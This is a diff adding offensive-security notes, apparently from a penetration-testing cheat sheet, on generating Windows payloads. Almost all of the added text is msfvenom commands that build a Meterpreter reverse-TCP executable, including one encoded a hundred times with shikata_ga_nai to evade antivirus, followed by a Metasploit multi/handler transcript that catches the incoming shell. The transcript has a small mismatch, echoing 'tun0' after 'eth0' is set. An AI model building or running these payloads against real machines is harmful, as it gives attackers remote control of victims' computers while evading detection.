@@ -1,3 +1,23 @@
 This section goes over the best payloads to use.
 
 https://github.com/xephora/PayloadsAllTheThings
+
+[Generating Payloads on Windows]
+
+[Regular Reverse TCP]
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe > shell.exe
+[Poly Morphic Reverse TCP]
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -e x64/shikata_ga_nai -i 100 -f exe > file.exe
+
+[Handler]
+msf5 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST eth0
+LHOST => tun0
+msf5 exploit(multi/handler) > set LPORT 32119
+LPORT => 32119
+msf5 exploit(multi/handler) > run
+
+https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
+https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
+
